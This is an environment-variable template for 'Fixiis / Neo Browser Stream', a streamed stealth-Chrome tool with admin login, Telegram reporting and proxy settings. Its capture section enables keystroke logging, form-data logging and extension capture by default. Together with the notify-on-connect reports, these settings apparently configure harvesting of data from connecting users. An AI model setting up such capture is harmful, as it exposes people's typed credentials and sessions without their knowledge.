# ============================================================================
# Fixiis / Neo Browser Stream — environment template
#
# Copy to .env and fill in. main.py loads .env automatically at startup
# (before config.py is imported), so anything set here wins over the
# defaults baked into config.py.
#
#   cp .env.example .env
#   chmod 600 .env
#
# NEVER commit .env — it is already in .gitignore.
# ============================================================================

# ---------------------------------------------------------------- required
# The app logs in with ADMIN_USERNAME + the bcrypt hash in
# ADMIN_PASSWORD_HASH. `python main.py` generates a random password and
# stores its hash on first run (and prints the password once).
# To set your own instead, generate a hash with:
#   python3 -c "import bcrypt;print(bcrypt.hashpw(b'YOUR_PASSWORD',bcrypt.gensalt(12)).decode())"
# Leave this empty only if you accept the well-known built-in password.
ADMIN_USERNAME=admin
ADMIN_PASSWORD_HASH=

# Random secret used to sign admin session tokens. `python main.py` writes
# one on first run; set your own long random string if you need sessions
# to survive a reinstall. Empty = insecure built-in placeholder.
JWT_SECRET_KEY=

# Public address clients and browsers will reach you on. Used by the
# Telegram reports and by anything that needs an absolute URL.
# Leave both empty unless the values are real: a domain that does not
# resolve to this box makes LPV pushes fail with "Failed to fetch",
# because the client is sent to a host it cannot reach.
PUBLIC_IP=
SERVER_DOMAIN=
USE_HTTPS=false

# ---------------------------------------------------------------- network
# 0.0.0.0  = this machine AND every device on its network (phone, laptop,
#            another PC). This is what you want for normal use.
# 127.0.0.1 = this machine only - nobody else can connect.
HOST=0.0.0.0
PORT=8446

# Comma-separated list of origins allowed to call the API. Needed when the
# admin panels are hosted somewhere else (Netlify, Pages, S3, or opened
# from disk). Leave unset for "*", which allows any origin.
# ALLOWED_ORIGINS=https://panel.example.com,https://ops.netlify.app

# ---------------------------------------------------------------- browser
# sb = SeleniumBase real-Chrome stealth backend (default, recommended)
# playwright = Playwright fallback backend
BROWSER_BACKEND=sb
HEADLESS=true
STEALTH_MODE=true
USE_SYSTEM_CHROME=true
# CHROME_PATH=/usr/bin/google-chrome
BROWSER_POOL_SIZE=10
MAX_SESSIONS=20

# ---------------------------------------------------------------- telegram
# Revoke and recreate the bot token via @BotFather before setting it here.
TELEGRAM_ENABLED=false
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=
TELEGRAM_ADMIN_IDS=
TELEGRAM_NOTIFY_ON_CONNECT=false
TELEGRAM_ADMIN_USERNAME=
TELEGRAM_ADMIN_PASSWORD=

# ---------------------------------------------------------------- proxy
PROXY_ENABLED=false
PROXY_SERVER=
PROXY_USERNAME=
PROXY_PASSWORD=

# ---------------------------------------------------------------- capture
# Keystroke logging is on by default in config.py. If you do not need it,
# turn it off here.
KEYLOG_ENABLED=true
KEYLOG_LOG_FORM_DATA=true
ENABLE_EXTENSION_CAPTURE=true
ENABLE_LIVE_LIBRARY=true

# ---------------------------------------------------------------- tuning
TARGET_FPS=30
QUALITY=80
USE_GPU=false
DEBUG_MODE=false
ENABLE_METRICS=false
